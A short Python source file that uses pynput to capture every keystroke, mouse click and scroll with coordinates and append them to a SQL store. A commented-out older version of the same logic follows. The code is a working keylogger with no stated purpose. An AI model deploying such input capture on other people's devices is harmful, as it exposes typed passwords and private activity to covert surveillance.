#!/mnt/e/winProgs/Python/python.exe
from _globals_ import *
from _sql_functions_ import *
from pynput import keyboard as kb, mouse as ms




def initListeners():
    global key_listener, mouse_listener;
    key_listener = kb.Listener(on_release = onKeyRelease);
    key_listener.start();
    mouse_listener = ms.Listener(on_click=onMouseClick, on_scroll=onMouseScroll);
    mouse_listener.start();
 
def onKeyRelease( key ):
	try: 
		sqlKeyRecordAppend( key.char );	
	except:
		if (key is kb.Key.enter): 
			sqlKeyRecordAppend( " <enter> " );
		elif (key is kb.Key.space): 
			sqlKeyRecordAppend( " <space> " );
		else:
			k = (key.name);
			sqlKeyRecordAppend( " <{}> ".format(k) );
def onMouseScroll(x, y, dx, dy):
	if (dx!=0): 
		sqlMouseRecordAppend( "<scrolled {} at {}\t".format( 'left' if dx<0 else 'right', (x,y)) );
	if (dy!=0): 
		sqlMouseRecordAppend( "<scrolled {} at {}\t".format( 'down' if dy<0 else 'up', (x,y)) );
def onMouseClick(x, y, button, pressed):
    sqlMouseRecordAppend( "<{}-{} at {}\t".format(button.name, "clicked" if pressed else "released",(x,y)) );




##from pynput import keyboard as kb, mouse as ms
##
##def initListeners():
##    global key_listener, mouse_listener;
##    key_listener = kb.Listener(on_release = onKeyRelease);
##    key_listener.start();
##    mouse_listener = ms.Listener(on_click=onMouseClick, on_scroll=onMouseScroll);
##    mouse_listener.start();
## 
##def onKeyRelease( key ):
##	global record;
##	try: 
##		k = (key.char);
##		record += k;
##		sqlKeyRecordAppend( k);	
##	except:
##		if (key is kb.Key.enter): 
##			record += "<enter>\n\t";
##			sqlKeyRecordAppend( " <enter> " );
##		elif (key is kb.Key.space): 
##			record += "< >";
##			sqlKeyRecordAppend( " <space> " );
##		else:
##			k = (key.name);
##			record += "<{}>".format(k);
##			sqlKeyRecordAppend( " <{}> ".format(k) );
##def onMouseScroll(x, y, dx, dy):
##	global record;
##	if (dx!=0): 
##		record += "\n\t<scrolled {} at {}".format( 'left' if dx<0 else 'right', (x,y));
##		sqlMouseRecordAppend( "<scrolled {} at {}\t".format( 'left' if dx<0 else 'right', (x,y)) );
##	if (dy!=0): 
##		record += "\n\t<scrolled {} at {}".format( 'down' if dy<0 else 'up', (x,y));
##		sqlMouseRecordAppend( "<scrolled {} at {}\t".format( 'down' if dy<0 else 'up', (x,y)) );
##def onMouseClick(x, y, button, pressed):
##    global record;
##    record += "\n\t<{}-{} at {}".format(button.name,"click" if pressed else "release",(x,y));
##    sqlMouseRecordAppend( "<{}-{} at {}\t".format(button.name, "clicked" if pressed else "released",(x,y)) );
##
